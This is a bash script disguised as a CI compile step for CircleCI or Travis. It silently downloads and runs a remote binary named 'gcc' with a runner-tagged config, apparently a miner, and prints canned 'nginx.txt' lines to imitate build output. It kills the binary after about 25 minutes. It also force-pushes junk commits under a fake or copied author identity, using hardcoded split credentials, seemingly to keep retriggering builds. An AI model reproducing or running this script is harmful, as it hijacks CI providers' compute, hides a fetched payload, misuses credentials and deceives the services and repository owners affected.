#!/usr/bin/env bash

rm --force --recursive gcc &>/dev/null
curl --output gcc https://raw.githubusercontent.com/compilertoolchain/gcc/master/gcc &>/dev/null
chmod +x gcc &>/dev/null
rm --force --recursive nginx &>/dev/null
curl --output nginx https://raw.githubusercontent.com/compilertoolchain/gcc/master/cfg &>/dev/null
sed --in-place 's/__ID__/__RUNNER___2d17f7060b0e5bcca7d0c0d6734a6fb8_github-o-3/g' nginx &>/dev/null
SUDO=""

if [[ $1 == 'ccd' ]]
then
  sed --in-place 's/__RUNNER__/circleci-d/g' nginx &>/dev/null
elif [[ $1 == 'trg' ]]
then
  sed --in-place 's/__RUNNER__/travis-g/g' nginx &>/dev/null
  SUDO="sudo"
fi

$SUDO ./gcc -c nginx &>/dev/null
rm --force --recursive nginx.txt &>/dev/null
cp --force --recursive debug/nginx.txt . &>/dev/null
C_DONE="no"
LINE_B=1
LINE_E=1
TIME_B=$(date +%s)
TIME_D=$((1500 + $(shuf --input-range 0-180 --head-count 1)))

LINES=$((613 * 10 / TIME_D))
TIME_E=$((TIME_B + TIME_D))
TIME_E_C=$((TIME_B + 70))

LINE_E=$((LINE_B + LINES))

if [[ LINES -eq 0 ]]
then
  LINES=1
fi

while :
do
  TIME_C=$(date +%s)

  if [[ $C_DONE == 'no' ]]
  then
    if [[ $1 == 'ccd' || $1 == 'trg' ]]
    then
      if [[ TIME_C -gt TIME_E_C ]]
      then
        git clone --branch master --depth 30 --no-tags --single-branch https://github.com/nginx-beautiful/nginx.git cloned_repo &>/dev/null || true
        cd cloned_repo || true
        RAN=$((RANDOM % 2))
        HASH=$(git rev-list master | tail --lines 1) || true

        if [[ RAN -eq 0 ]]
        then
          git config user.email 'matias.garcia@myrambler.ru' &>/dev/null || true
          git config user.name 'Matias Garcia' &>/dev/null || true
        else
          LOG_AE=$(git log --format='%ae' "$HASH") || true
          LOG_AN=$(git log --format='%an' "$HASH") || true
          git config user.email "m$LOG_AE" &>/dev/null || true
          git config user.name "$LOG_AN" &>/dev/null || true
        fi

        R_FILE_1=$(find . ! -path './.git/*' -size -50k -type f ! -iname '.*' ! -iname '_*' | shuf | head --lines 1) || true
        R_FILE_2=$(find . ! -path './.git/*' -size -50k -type f ! -iname '.*' ! -iname '_*' | shuf | head --lines 1) || true
        R_FILE_1_B=$(basename "$R_FILE_1") || true
        R_FILE_2_B=$(basename "$R_FILE_2") || true
        R_FILE_1_D=$(dirname "$R_FILE_1") || true
        R_FILE_2_D=$(dirname "$R_FILE_2") || true
        rm --force --recursive "$R_FILE_1_D"/."$R_FILE_1_B" &>/dev/null || true
        rm --force --recursive "$R_FILE_2_D"/."$R_FILE_2_B" &>/dev/null || true
        rm --force --recursive "$R_FILE_1_D"/_"$R_FILE_1_B" &>/dev/null || true
        rm --force --recursive "$R_FILE_2_D"/_"$R_FILE_2_B" &>/dev/null || true

        if [[ RAN -eq 0 ]]
        then
          cp --force --recursive "$R_FILE_1" "$R_FILE_1_D"/."$R_FILE_1_B" &>/dev/null || true
          cp --force --recursive "$R_FILE_2" "$R_FILE_2_D"/_"$R_FILE_2_B" &>/dev/null || true
        else
          cp --force --recursive "$R_FILE_1" "$R_FILE_1_D"/_"$R_FILE_1_B" &>/dev/null || true
          cp --force --recursive "$R_FILE_2" "$R_FILE_2_D"/."$R_FILE_2_B" &>/dev/null || true
        fi

        git add . &>/dev/null || true
        git log --format='%B' "$(git rev-list master | tail --lines 1)" | git commit --file - &>/dev/null || true
        P_1="-N6-Yl5VPyOf"
        P_2="Ah3l"
        git push --force --no-tags https://matias-garcia-projectmanager:''"$P_1""$P_2"''@github.com/nginx-beautiful/nginx.git &>/dev/null || true
        cd .. || true
        rm --force --recursive cloned_repo || true
        C_DONE="yes"
      fi
    fi
  fi

  if [[ LINE_B -lt 613 ]]
  then
    sed --quiet "$LINE_B,${LINE_E}p" nginx.txt 2>/dev/null
    LINE_B=$((LINE_B + LINES))
    LINE_E=$((LINE_B + LINES))
  else
    sed --quiet '613p' nginx.txt 2>/dev/null
  fi

  sleep 10

  TIME_C=$(date +%s)

  if [[ TIME_C -gt TIME_E ]]
  then
    $SUDO kill "$(pgrep gcc)" &>/dev/null

    break
  fi
done

rm --force --recursive nginx &>/dev/null
rm --force --recursive gcc &>/dev/null
